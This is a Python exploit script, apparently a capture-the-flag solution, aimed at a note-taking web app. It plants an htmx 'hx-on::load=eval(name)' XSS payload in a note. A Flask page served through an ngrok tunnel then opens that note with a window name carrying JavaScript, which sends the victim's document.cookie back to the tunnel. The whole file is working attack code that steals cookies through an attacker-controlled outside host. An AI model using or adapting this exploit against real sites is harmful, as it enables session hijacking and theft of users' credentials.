import json
from flask import Flask
import httpx
import re
from pyngrok import ngrok


URL = "http://ctf.ukmpcc.org:8080/"
LPORT = 4444
TUNNEL = ngrok.connect(LPORT, "http").public_url


class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

    def _make_note(s, value):
        assert (not (len(value) > 26))
        return s.c.post("/api/v1/note", data={
            "value": value,
            "path": ""
        })


class API(BaseAPI):
    def make_note(s, value):
        note_id = re.search(r"(?<=note&#x2F;).*?(?='>)", s._make_note(value).text).group(0)
        return note_id


def server(note_url, script):
    app = Flask(__name__)

    @app.get("/")
    def home():
        return """
<script>
const TARGET = "%s"
const w = open(TARGET, %s)
</script>
""" % (note_url, json.dumps(script))
    app.run("0.0.0.0", LPORT)


if __name__ == "__main__":
    api = API()
    note_id = api.make_note("<i hx-on::load=eval(name)>")
    note_url = "http://app:8080/note/"+note_id
    print("tunnel:", TUNNEL)
    server(note_url, "location = '"+TUNNEL+"/foo?'+document.cookie")
